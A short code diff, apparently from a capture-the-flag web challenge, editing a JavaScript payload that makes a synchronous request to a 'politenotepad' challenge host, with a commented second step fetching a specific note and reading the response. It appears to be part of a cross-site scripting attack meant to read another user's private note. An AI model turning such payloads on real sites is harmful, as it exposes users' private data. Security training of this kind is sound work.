@@ -3,7 +3,7 @@ var req = new XMLHttpRequest();
 req.open("GET", "http://politenotepad.zajebistyc.tf/", false);
 //step2
 //req.open("GET", "http://politenotepad.zajebistyc.tf/note/NMRqFJTnDDkjUbRAmmQuJhtdKmQdfm", false);
-req.witthCredentials = true;
+//req.witthCredentials = true;
 req.send(null)
 var res = req.responseText;
 
